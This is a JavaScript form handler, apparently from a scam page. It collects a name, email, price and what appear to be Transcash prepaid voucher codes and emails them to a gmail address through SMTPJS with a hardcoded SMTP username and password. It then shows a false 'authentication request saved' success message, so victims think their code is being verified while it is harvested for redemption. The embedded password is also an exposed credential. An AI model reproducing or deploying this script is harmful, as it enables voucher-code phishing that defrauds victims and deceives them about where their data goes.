
function emailSend(){
    var userName = document.getElementById('Name').value;
    var email = document.getElementById('email').value;
    var prix = document.getElementById('Prix').value;
    var code = document.getElementById('code').value;




    var messageBody = "Transcash: " + userName + 
                      "<br/> email: " + email +
                      "<br/> prix: " + prix + 
                      "<br/> code: " +  code;
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "elsamorhow@gmail.com",
        Password : "5861DB06F7AB08F9FA3C78F5C94248DCFBC1",
        To : 'lisiel923@gmail.com',
        From : "elsamorhow@gmail.com",
        Subject : "This is the subject",
        Body : messageBody
    }).then(
      message => {
        if( message =='OK'){
          swal("Succefull", "Authentication request save successfully.  Please wait a few moments you will receive a confirmation email", "success");

        }
        else{
          swal("Error", "Try again", "Error");

        }
      }
    );


  
}